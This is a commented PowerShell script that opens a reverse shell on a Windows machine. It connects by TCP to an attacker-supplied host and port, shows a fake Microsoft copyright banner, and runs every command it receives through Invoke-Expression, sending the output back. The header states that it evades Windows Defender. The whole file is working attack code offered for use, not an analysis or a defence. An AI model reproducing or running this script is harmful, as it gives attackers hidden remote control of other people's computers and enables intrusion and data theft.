# Powershell script to create reverse shell on windows system 
# This also voids the windows defender system unlike some other attempts at a reverse shell

# Create a new connection at ip address and root 
$c = New-Object System.Net.Sockets.TCPClient($args[0],$args[1]);
# Create a client stream to read and write to the connection
$I = $c.GetStream();
# Creating a byte array to allow for space for 
[byte[]]$U = 0..(2-shl15)|%{0};
$U = ([text.encoding]::ASCII).GetBytes("Copyright (C) 2021 Microsoft Corporation. All rights reserved.`n`n")
# Writing output to client stream 
$I.Write($U,0,$U.Length)
# Get location of Path Directory and encode in ASCII
$U = ([text.encoding]::ASCII).GetBytes((Get-Location).Path + '>')
$I.Write($U,0,$U.Length)

while(($k = $I.Read($U, 0, $U.Length)) -ne 0){;$D = (New-Object System.Text.UTF8Encoding).GetString($U,0, $k);
# Create stdin and stderr for the reverse shell 
$a = (iex $D 2>&1 | Out-String );
# Add the Path of the system in the current dir to the reverse shell
$r  = $a + (pwd).Path + '> ';
$m = ([text.encoding]::ASCII).GetBytes($r);
$I.Write($m,0,$m.Length);
$I.Flush()};
# Close the connection after the Attackers connection has closed
$c.Close()